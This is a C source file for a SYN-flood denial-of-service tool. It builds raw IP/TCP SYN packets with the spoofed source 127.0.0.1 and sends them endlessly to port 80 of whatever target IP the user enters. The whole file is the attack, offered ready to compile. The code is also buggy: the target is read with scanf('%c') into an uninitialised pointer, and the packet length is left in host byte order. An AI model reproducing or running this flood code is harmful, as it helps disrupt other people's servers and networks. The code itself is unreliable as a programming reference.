#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

// Pseudo header needed for TCP checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

// Compute checksum
unsigned short checksum(void *data, int len) {
    unsigned short *buf = data;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

// Create the IP header
void fill_ip_header(struct iphdr *iph, const char *src_ip, const char *dst_ip) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Leave checksum 0 now, filled later
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(dst_ip);

    iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));
}

// Create the TCP header
void fill_tcp_header(struct tcphdr *tcph, u_int16_t src_port, u_int16_t dst_port) {
    tcph->source = htons(src_port);
    tcph->dest = htons(dst_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // TCP header size
    tcph->fin = 0;
    tcph->syn = 1; // SYN flag
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); // Window size
    tcph->check = 0; // Leave checksum 0 now, filled later
    tcph->urg_ptr = 0;
}

// Calculate TCP checksum
unsigned short calculate_tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    struct pseudo_header psh;
    char pseudogram[4096];

    // Fill the pseudo header
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    // Prepare the pseudogram
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    return checksum((unsigned short *)pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
}

void flood(const char *ipDestination) {
    while (1)
    {
        int sock;
        struct sockaddr_in dest;
        struct iphdr iph;
        struct tcphdr tcph;
        char packet[4096];

        // Create a raw socket
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            perror("Socket creation failed");
        }

        // Zero out the packet buffer
        memset(packet, 0, 4096);

        // Fill IP and TCP headers
        fill_ip_header(&iph, "127.0.0.1", ipDestination);
        fill_tcp_header(&tcph, 1234, 80);

        // Calculate and set TCP checksum
        tcph.check = calculate_tcp_checksum(&iph, &tcph);

        // Copy IP and TCP headers into packet
        memcpy(packet, &iph, sizeof(struct iphdr));
        memcpy(packet + sizeof(struct iphdr), &tcph, sizeof(struct tcphdr));

        // Destination address
        dest.sin_family = AF_INET;
        dest.sin_port = htons(80);
        dest.sin_addr.s_addr = iph.daddr;

        // Send the packet
        if (sendto(sock, packet, iph.tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Send failed");
            close(sock);
        }

        printf("Packet sent successfully\n");

        // Close the socket
        close(sock);
    }
}

int main() {
    char *targetIP;

    printf("Enter IP Address Target >> "); scanf("%c", targetIP);

    flood(targetIP);

    return 0;
}
// gcc -o send_raw_tcp send_raw_tcp.c